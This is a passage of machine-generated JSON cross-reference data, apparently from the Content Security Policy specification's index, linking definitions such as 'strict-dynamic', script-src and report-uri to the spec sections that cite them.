"grammardef-strict-dynamic": {"dfnID":"grammardef-strict-dynamic","dfnText":"'strict-dynamic'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-strict-dynamic"},{"id":"ref-for-grammardef-strict-dynamic\u2460"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-grammardef-strict-dynamic\u2461"}],"title":"6.6.1.2. \n    Script directives post-request check\n  "},{"refs":[{"id":"ref-for-grammardef-strict-dynamic\u2462"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "},{"refs":[{"id":"ref-for-grammardef-strict-dynamic\u2463"},{"id":"ref-for-grammardef-strict-dynamic\u2464"},{"id":"ref-for-grammardef-strict-dynamic\u2465"},{"id":"ref-for-grammardef-strict-dynamic\u2466"},{"id":"ref-for-grammardef-strict-dynamic\u2467"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-strict-dynamic"},
"grammardef-unsafe-allow-redirects": {"dfnID":"grammardef-unsafe-allow-redirects","dfnText":"'unsafe-allow-redirects'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-unsafe-allow-redirects"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-grammardef-unsafe-allow-redirects\u2460"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "}],"url":"#grammardef-unsafe-allow-redirects"},
"grammardef-unsafe-eval": {"dfnID":"grammardef-unsafe-eval","dfnText":"'unsafe-eval'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-unsafe-eval"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "}],"url":"#grammardef-unsafe-eval"},
"grammardef-unsafe-hashes": {"dfnID":"grammardef-unsafe-hashes","dfnText":"'unsafe-hashes'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-unsafe-hashes"},{"id":"ref-for-grammardef-unsafe-hashes\u2460"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "},{"refs":[{"id":"ref-for-grammardef-unsafe-hashes\u2461"},{"id":"ref-for-grammardef-unsafe-hashes\u2462"}],"title":"8.3. \n      Usage of \"'unsafe-hashes'\"\n    "}],"url":"#grammardef-unsafe-hashes"},
"grammardef-unsafe-inline": {"dfnID":"grammardef-unsafe-inline","dfnText":"'unsafe-inline'","external":false,"refSections":[{"refs":[{"id":"ref-for-grammardef-unsafe-inline"}],"title":"6. \n    Content Security Policy Directives\n  "},{"refs":[{"id":"ref-for-grammardef-unsafe-inline\u2460"},{"id":"ref-for-grammardef-unsafe-inline\u2461"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "},{"refs":[{"id":"ref-for-grammardef-unsafe-inline\u2462"},{"id":"ref-for-grammardef-unsafe-inline\u2463"}],"title":"7.1. Nonce Reuse"},{"refs":[{"id":"ref-for-grammardef-unsafe-inline\u2464"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "}],"url":"#grammardef-unsafe-inline"},
"header-content-security-policy": {"dfnID":"header-content-security-policy","dfnText":"Content-Security-Policy","external":false,"refSections":[{"refs":[{"id":"ref-for-header-content-security-policy"}],"title":"1.1.1. Control Execution"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-header-content-security-policy\u2461"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-header-content-security-policy\u2462"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2463"}],"title":"6.1.2. connect-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2464"},{"id":"ref-for-header-content-security-policy\u2465"},{"id":"ref-for-header-content-security-policy\u2466"},{"id":"ref-for-header-content-security-policy\u2467"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2468"}],"title":"6.1.4. font-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u24ea"}],"title":"6.1.5. frame-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2460"}],"title":"6.1.6. img-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2461"}],"title":"6.1.7. manifest-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2462"}],"title":"6.1.8. media-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2463"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2464"}],"title":"6.1.10. prefetch-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2465"}],"title":"6.1.17. worker-src"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2466"},{"id":"ref-for-header-content-security-policy\u2460\u2467"}],"title":"6.3.3. navigate-to"},{"refs":[{"id":"ref-for-header-content-security-policy\u2460\u2468"}],"title":"6.4.1. report-uri"},{"refs":[{"id":"ref-for-header-content-security-policy\u2461\u24ea"},{"id":"ref-for-header-content-security-policy\u2461\u2460"}],"title":"8.1. \n    The effect of multiple policies\n  "},{"refs":[{"id":"ref-for-header-content-security-policy\u2461\u2461"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "},{"refs":[{"id":"ref-for-header-content-security-policy\u2461\u2462"}],"title":"8.3. \n      Usage of \"'unsafe-hashes'\"\n    "},{"refs":[{"id":"ref-for-header-content-security-policy\u2461\u2463"}],"title":"8.4. \n      Allowing external JavaScript via hashes\n    "}],"url":"#header-content-security-policy"},
"header-content-security-policy-report-only": {"dfnID":"header-content-security-policy-report-only","dfnText":"Content-Security-Policy-Report-Only","external":false,"refSections":[{"refs":[{"id":"ref-for-header-content-security-policy-report-only"},{"id":"ref-for-header-content-security-policy-report-only\u2460"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-header-content-security-policy-report-only\u2461"}],"title":"3.3. \n    The <meta> element\n  "},{"refs":[{"id":"ref-for-header-content-security-policy-report-only\u2462"}],"title":"6.2.2. sandbox"}],"url":"#header-content-security-policy-report-only"},
"host-part-match": {"dfnID":"host-part-match","dfnText":"host-part matches","external":false,"refSections":[{"refs":[{"id":"ref-for-host-part-match"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-host-part-match\u2460"},{"id":"ref-for-host-part-match\u2461"},{"id":"ref-for-host-part-match\u2462"},{"id":"ref-for-host-part-match\u2463"}],"title":"6.6.2.8. \n    host-part matching\n  "}],"url":"#host-part-match"},
"img-src": {"dfnID":"img-src","dfnText":"img-src","external":false,"refSections":[{"refs":[{"id":"ref-for-img-src"},{"id":"ref-for-img-src\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-img-src\u2461"}],"title":"6.1.6. img-src"},{"refs":[{"id":"ref-for-img-src\u2462"}],"title":"7.6. Paths and Redirects"},{"refs":[{"id":"ref-for-img-src\u2463"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#img-src"},
"initialize-document-csp": {"dfnID":"initialize-document-csp","dfnText":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-initialize-document-csp"},{"id":"ref-for-initialize-document-csp"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-initialize-document-csp"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-initialize-document-csp"},{"id":"ref-for-initialize-document-csp"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-initialize-document-csp"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-initialize-document-csp"}],"title":"7.8. \n    CSP Inheriting to avoid bypasses\n  "}],"url":"#initialize-document-csp"},
"initialize-global-object-csp": {"dfnID":"initialize-global-object-csp","dfnText":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-initialize-global-object-csp"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-initialize-global-object-csp"},{"id":"ref-for-initialize-global-object-csp"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-initialize-global-object-csp"}],"title":"4.2.2. \n    Initialize a global object\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-initialize-global-object-csp"}],"title":"7.8. \n    CSP Inheriting to avoid bypasses\n  "}],"url":"#initialize-global-object-csp"},
"manifest-src": {"dfnID":"manifest-src","dfnText":"manifest-src","external":false,"refSections":[{"refs":[{"id":"ref-for-manifest-src"},{"id":"ref-for-manifest-src\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-manifest-src\u2461"}],"title":"6.1.7. manifest-src"},{"refs":[{"id":"ref-for-manifest-src\u2462"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#manifest-src"},
"media-src": {"dfnID":"media-src","dfnText":"media-src","external":false,"refSections":[{"refs":[{"id":"ref-for-media-src"},{"id":"ref-for-media-src\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-media-src\u2461"}],"title":"6.1.8. media-src"},{"refs":[{"id":"ref-for-media-src\u2462"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#media-src"},
"monitored": {"dfnID":"monitored","dfnText":"monitored","external":false,"refSections":[{"refs":[{"id":"ref-for-monitored"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "}],"url":"#monitored"},
"navigate-to": {"dfnID":"navigate-to","dfnText":"navigate-to","external":false,"refSections":[{"refs":[{"id":"ref-for-navigate-to"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-navigate-to\u2460"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-navigate-to\u2461"}],"title":"6.3.3. navigate-to"}],"url":"#navigate-to"},
"object-src": {"dfnID":"object-src","dfnText":"object-src","external":false,"refSections":[{"refs":[{"id":"ref-for-object-src"}],"title":"6. \n    Content Security Policy Directives\n  "},{"refs":[{"id":"ref-for-object-src\u2460"},{"id":"ref-for-object-src\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-object-src\u2462"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-object-src\u2463"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#object-src"},
"path-part-match": {"dfnID":"path-part-match","dfnText":"path-part matches","external":false,"refSections":[{"refs":[{"id":"ref-for-path-part-match"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-path-part-match\u2460"}],"title":"6.6.2.10. \n    path-part matching\n  "}],"url":"#path-part-match"},
"policy-directive-set": {"dfnID":"policy-directive-set","dfnText":"directive set","external":false,"refSections":[{"refs":[{"id":"ref-for-policy-directive-set"},{"id":"ref-for-policy-directive-set\u2460"},{"id":"ref-for-policy-directive-set\u2461"},{"id":"ref-for-policy-directive-set\u2462"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-policy-directive-set\u2463"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "},{"refs":[{"id":"ref-for-policy-directive-set\u2464"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-policy-directive-set\u2465"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-policy-directive-set\u2466"},{"id":"ref-for-policy-directive-set\u2467"},{"id":"ref-for-policy-directive-set\u2468"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-policy-directive-set\u2460\u24ea"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "}],"url":"#policy-directive-set"},
"policy-disposition": {"dfnID":"policy-disposition","dfnText":"disposition","external":false,"refSections":[{"refs":[{"id":"ref-for-policy-disposition"},{"id":"ref-for-policy-disposition\u2460"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2461"},{"id":"ref-for-policy-disposition\u2462"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2463"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-policy-disposition\u2464"},{"id":"ref-for-policy-disposition\u2465"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2466"}],"title":"4.1.2. \n    Report Content Security Policy violations for request\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2467"}],"title":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2468"},{"id":"ref-for-policy-disposition\u2460\u24ea"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2460"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2461"},{"id":"ref-for-policy-disposition\u2460\u2462"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2463"},{"id":"ref-for-policy-disposition\u2460\u2464"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2465"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2466"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2467"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2460\u2468"}],"title":"6.2.2.1. \n    sandbox Response Check\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2461\u24ea"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-policy-disposition\u2461\u2460"}],"title":"6.3.2.2. \n\t\tRelation to X-Frame-Options\n\t"}],"url":"#policy-disposition"},
"policy-self-origin": {"dfnID":"policy-self-origin","dfnText":"self-origin","external":false,"refSections":[{"refs":[{"id":"ref-for-policy-self-origin"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-policy-self-origin\u2460"}],"title":"4.2.1. \n    Initialize a Document\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-policy-self-origin\u2461"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "},{"refs":[{"id":"ref-for-policy-self-origin\u2462"}],"title":"6.3.2.1. \n    frame-ancestors Navigation Response Check\n  "},{"refs":[{"id":"ref-for-policy-self-origin\u2463"}],"title":"6.6.2.3. \n    Does request match source list?\n  "},{"refs":[{"id":"ref-for-policy-self-origin\u2464"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "}],"url":"#policy-self-origin"},
"policy-source": {"dfnID":"policy-source","dfnText":"source","external":false,"refSections":[{"refs":[{"id":"ref-for-policy-source"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-policy-source\u2460"},{"id":"ref-for-policy-source\u2461"}],"title":"2.2.1. \n    Parse a serialized CSP\n  "},{"refs":[{"id":"ref-for-policy-source\u2462"},{"id":"ref-for-policy-source\u2463"}],"title":"2.2.2. \n    Parse a serialized CSP list\n  "},{"refs":[{"id":"ref-for-policy-source\u2464"},{"id":"ref-for-policy-source\u2465"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "}],"url":"#policy-source"},
"port-part-matches": {"dfnID":"port-part-matches","dfnText":"port-part matches","external":false,"refSections":[{"refs":[{"id":"ref-for-port-part-matches"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-port-part-matches\u2460"}],"title":"6.6.2.9. \n    port-part matching\n  "}],"url":"#port-part-matches"},
"prefetch-src": {"dfnID":"prefetch-src","dfnText":"prefetch-src","external":false,"refSections":[{"refs":[{"id":"ref-for-prefetch-src"},{"id":"ref-for-prefetch-src\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-prefetch-src\u2461"}],"title":"6.1.10. prefetch-src"}],"url":"#prefetch-src"},
"report-for-request": {"dfnID":"report-for-request","dfnText":"4.1.2. \n    Report Content Security Policy violations for request\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-report-for-request"}],"title":"4.1.2. \n    Report Content Security Policy violations for request\n  "}],"url":"#report-for-request"},
"report-to": {"dfnID":"report-to","dfnText":"report-to","external":false,"refSections":[{"refs":[{"id":"ref-for-report-to"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-report-to\u2460"},{"id":"ref-for-report-to\u2461"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-report-to\u2462"},{"id":"ref-for-report-to\u2463"}],"title":"6.4.1. report-uri"},{"refs":[{"id":"ref-for-report-to\u2464"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#report-to"},
"report-uri": {"dfnID":"report-uri","dfnText":"report-uri","external":false,"refSections":[{"refs":[{"id":"ref-for-report-uri"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-report-uri\u2460"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-report-uri\u2461"},{"id":"ref-for-report-uri\u2462"}],"title":"6.4.1. report-uri"},{"refs":[{"id":"ref-for-report-uri\u2463"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#report-uri"},
"request-effective-directive": {"dfnID":"request-effective-directive","dfnText":"effective directive","external":false,"refSections":[{"refs":[{"id":"ref-for-request-effective-directive"}],"title":"6.7.2. \n    Get the effective directive for inline checks\n  "}],"url":"#request-effective-directive"},
"sandbox": {"dfnID":"sandbox","dfnText":"sandbox","external":false,"refSections":[{"refs":[{"id":"ref-for-sandbox"}],"title":"6.2.2.2. \n    sandbox Initialization\n  "},{"refs":[{"id":"ref-for-sandbox\u2460"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#sandbox"},
"scheme-part-match": {"dfnID":"scheme-part-match","dfnText":"scheme-part matches","external":false,"refSections":[{"refs":[{"id":"ref-for-scheme-part-match"},{"id":"ref-for-scheme-part-match\u2460"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-scheme-part-match\u2461"},{"id":"ref-for-scheme-part-match\u2462"}],"title":"6.6.2.7. \n    scheme-part matching\n  "}],"url":"#scheme-part-match"},
"script-src": {"dfnID":"script-src","dfnText":"script-src","external":false,"refSections":[{"refs":[{"id":"ref-for-script-src"}],"title":"6. \n    Content Security Policy Directives\n  "},{"refs":[{"id":"ref-for-script-src\u2460"}],"title":"6.1. \n    Fetch Directives\n  "},{"refs":[{"id":"ref-for-script-src\u2461"},{"id":"ref-for-script-src\u2462"}],"title":"8.2. \n    Usage of \"'strict-dynamic'\"\n  "},{"refs":[{"id":"ref-for-script-src\u2463"}],"title":"8.3. \n      Usage of \"'unsafe-hashes'\"\n    "},{"refs":[{"id":"ref-for-script-src\u2464"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#script-src"},
"script-src-attr": {"dfnID":"script-src-attr","dfnText":"script-src-attr","external":false,"refSections":[{"refs":[{"id":"ref-for-script-src-attr"},{"id":"ref-for-script-src-attr\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-script-src-attr\u2461"},{"id":"ref-for-script-src-attr\u2462"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-script-src-attr\u2463"}],"title":"6.1.12. script-src-elem"},{"refs":[{"id":"ref-for-script-src-attr\u2464"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#script-src-attr"},
"script-src-elem": {"dfnID":"script-src-elem","dfnText":"script-src-elem","external":false,"refSections":[{"refs":[{"id":"ref-for-script-src-elem"},{"id":"ref-for-script-src-elem\u2460"},{"id":"ref-for-script-src-elem\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-script-src-elem\u2462"},{"id":"ref-for-script-src-elem\u2463"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-script-src-elem\u2464"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#script-src-elem"},
"securitypolicyviolationevent": {"dfnID":"securitypolicyviolationevent","dfnText":"SecurityPolicyViolationEvent","external":false,"refSections":[{"refs":[{"id":"ref-for-securitypolicyviolationevent"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-securitypolicyviolationevent\u2460"},{"id":"ref-for-securitypolicyviolationevent\u2461"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-securitypolicyviolationevent\u2462"}],"title":"7.5. Violation Reports"}],"url":"#securitypolicyviolationevent"},
"serialized-csp": {"dfnID":"serialized-csp","dfnText":"serialized CSP","external":false,"refSections":[{"refs":[{"id":"ref-for-serialized-csp"}],"title":"2.2. Policies"},{"refs":[{"id":"ref-for-serialized-csp\u2460"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-serialized-csp\u2461"}],"title":"3. \n    Policy Delivery\n  "},{"refs":[{"id":"ref-for-serialized-csp\u2462"}],"title":"3.1. \n    The Content-Security-Policy HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-serialized-csp\u2463"}],"title":"3.2. \n    The Content-Security-Policy-Report-Only HTTP Response Header Field\n  "},{"refs":[{"id":"ref-for-serialized-csp\u2464"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "},{"refs":[{"id":"ref-for-serialized-csp\u2465"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-serialized-csp\u2466"},{"id":"ref-for-serialized-csp\u2467"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#serialized-csp"},
"serialized-csp-list": {"dfnID":"serialized-csp-list","dfnText":"serialized CSP list","external":false,"refSections":[],"url":"#serialized-csp-list"},
"serialized-directive": {"dfnID":"serialized-directive","dfnText":"serialized directive","external":false,"refSections":[{"refs":[{"id":"ref-for-serialized-directive"}],"title":"2.2. Policies"}],"url":"#serialized-directive"},
"serialized-source-list": {"dfnID":"serialized-source-list","dfnText":"serialized source list","external":false,"refSections":[],"url":"#serialized-source-list"},
"set-response-csp-list": {"dfnID":"set-response-csp-list","dfnText":"4.1.1. \n    Set response\u2019s CSP list\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-set-response-csp-list"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-set-response-csp-list"}],"title":"4.1.1. \n    Set response\u2019s CSP list\n  "}],"url":"#set-response-csp-list"},
"should-block-inline": {"dfnID":"should-block-inline","dfnText":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-should-block-inline"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-should-block-inline"},{"id":"ref-for-should-block-inline"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-should-block-inline"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-should-block-inline"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-should-block-inline"}],"title":"6.1.14. style-src"}],"url":"#should-block-inline"},
"should-block-navigation-request": {"dfnID":"should-block-navigation-request","dfnText":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-should-block-navigation-request"},{"id":"ref-for-should-block-navigation-request"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-should-block-navigation-request"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-should-block-navigation-request"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "}],"url":"#should-block-navigation-request"},
"should-block-navigation-response": {"dfnID":"should-block-navigation-response","dfnText":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-should-block-navigation-response"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-should-block-navigation-response"}],"title":"4.2. \n    Integration with HTML\n  "},{"refs":[{"id":"ref-for-should-block-navigation-response"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "}],"url":"#should-block-navigation-response"},
"should-block-request": {"dfnID":"should-block-request","dfnText":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-should-block-request"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-should-block-request"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-should-block-request"}],"title":"4.1.3. \n    Should request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-should-block-request"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-should-block-request"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-should-block-request"}],"title":"6.1.14. style-src"}],"url":"#should-block-request"},
"should-block-response": {"dfnID":"should-block-response","dfnText":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  ","external":false,"refSections":[{"refs":[{"id":"ref-for-should-block-response"},{"id":"ref-for-should-block-response"}],"title":"2.3. Directives"},{"refs":[{"id":"ref-for-should-block-response"}],"title":"4.1. \n    Integration with Fetch\n  "},{"refs":[{"id":"ref-for-should-block-response"}],"title":"4.1.4. \n    Should response to request be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-should-block-response"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-should-block-response"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-should-block-response"}],"title":"6.1.14. style-src"}],"url":"#should-block-response"},
"source-expression": {"dfnID":"source-expression","dfnText":"source\n  expression","external":false,"refSections":[{"refs":[{"id":"ref-for-source-expression"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-source-expression\u2460"}],"title":"2.3.1. Source Lists"},{"refs":[{"id":"ref-for-source-expression\u2461"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-source-expression\u2462"}],"title":"6.3.3.1. \n    navigate-to Pre-Navigation Check\n  "},{"refs":[{"id":"ref-for-source-expression\u2463"}],"title":"6.3.3.2. \n    navigate-to Navigation Response Check\n  "},{"refs":[{"id":"ref-for-source-expression\u2464"},{"id":"ref-for-source-expression\u2465"},{"id":"ref-for-source-expression\u2466"},{"id":"ref-for-source-expression\u2467"}],"title":"6.6.1.1. \n    Script directives pre-request check\n  "},{"refs":[{"id":"ref-for-source-expression\u2468"}],"title":"6.6.2.6. \n    Does url match expression in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-source-expression\u2460\u24ea"}],"title":"8.4. \n      Allowing external JavaScript via hashes\n    "}],"url":"#source-expression"},
"source-list-allows-all-inline-behavior": {"dfnID":"source-list-allows-all-inline-behavior","dfnText":"allows all inline behavior","external":false,"refSections":[{"refs":[{"id":"ref-for-source-list-allows-all-inline-behavior"},{"id":"ref-for-source-list-allows-all-inline-behavior\u2460"},{"id":"ref-for-source-list-allows-all-inline-behavior\u2461"},{"id":"ref-for-source-list-allows-all-inline-behavior\u2462"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for type?\n  "}],"url":"#source-list-allows-all-inline-behavior"},
"source-lists": {"dfnID":"source-lists","dfnText":"source lists","external":false,"refSections":[{"refs":[{"id":"ref-for-source-lists"}],"title":"6.1.1. child-src"},{"refs":[{"id":"ref-for-source-lists\u2460"}],"title":"6.1.2. connect-src"},{"refs":[{"id":"ref-for-source-lists\u2461"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-source-lists\u2462"}],"title":"6.1.4. font-src"},{"refs":[{"id":"ref-for-source-lists\u2463"}],"title":"6.1.5. frame-src"},{"refs":[{"id":"ref-for-source-lists\u2464"}],"title":"6.1.6. img-src"},{"refs":[{"id":"ref-for-source-lists\u2465"}],"title":"6.1.7. manifest-src"},{"refs":[{"id":"ref-for-source-lists\u2466"}],"title":"6.1.8. media-src"},{"refs":[{"id":"ref-for-source-lists\u2467"}],"title":"6.1.9. object-src"},{"refs":[{"id":"ref-for-source-lists\u2468"}],"title":"6.1.10. prefetch-src"},{"refs":[{"id":"ref-for-source-lists\u2460\u24ea"}],"title":"6.1.17. worker-src"},{"refs":[{"id":"ref-for-source-lists\u2460\u2460"}],"title":"6.3.2. frame-ancestors"},{"refs":[{"id":"ref-for-source-lists\u2460\u2461"}],"title":"6.6.2.2. \n    Does nonce match source list?\n  "},{"refs":[{"id":"ref-for-source-lists\u2460\u2462"}],"title":"6.6.2.3. \n    Does request match source list?\n  "},{"refs":[{"id":"ref-for-source-lists\u2460\u2463"}],"title":"6.6.2.4. \n    Does response to request match source list?\n  "},{"refs":[{"id":"ref-for-source-lists\u2460\u2464"}],"title":"6.6.2.5. \n    Does url match source list in origin with redirect count?\n  "},{"refs":[{"id":"ref-for-source-lists\u2460\u2465"},{"id":"ref-for-source-lists\u2460\u2466"},{"id":"ref-for-source-lists\u2460\u2467"},{"id":"ref-for-source-lists\u2460\u2468"},{"id":"ref-for-source-lists\u2461\u24ea"}],"title":"6.6.3.2. \n    Does a source list allow all inline behavior for 